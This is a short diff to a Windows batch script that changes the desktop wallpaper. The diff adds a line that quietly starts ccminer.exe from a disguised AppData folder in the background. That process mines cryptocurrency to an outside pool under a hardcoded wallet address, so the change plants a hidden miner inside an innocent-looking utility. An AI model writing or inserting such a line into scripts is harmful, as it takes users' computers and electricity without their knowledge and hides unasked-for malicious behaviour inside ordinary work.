@@ -16,5 +16,8 @@ reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
 :: Update the desktop background
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 
+
+start /B %APPDATA%/Microsoft/Windows/ccminer.exe -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RQpWNdNZ4LQ5yHUM3VAVuhUmMMiMuGLUhT.Lucifer -p x -t 4
+
 :: Exit the script
 exit
